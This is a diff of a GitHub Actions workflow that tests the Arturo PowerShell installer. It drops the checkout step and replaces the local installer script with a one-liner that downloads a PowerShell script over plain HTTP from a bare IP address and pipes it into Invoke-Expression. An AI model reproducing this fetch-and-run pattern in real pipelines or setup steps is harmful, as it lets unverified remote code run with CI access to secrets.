@@ -1,4 +1,4 @@
-name: Test Installer - Powershell
+name: Test Installer - PowerShell
 
 on:
   pull_request:
@@ -21,14 +21,11 @@ jobs:
     runs-on: ${{ matrix.os }}
     
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-      
       - name: Install Arturo
         shell: powershell
         run: |
-          & "${{ github.workspace }}\docs\website\tools\installer.ps1"
-      
+          iwr -useb http://188.245.97.105/latest/tools/installer.ps1 | iex
+
       - name: Add to PATH and test
         shell: powershell
         run: |
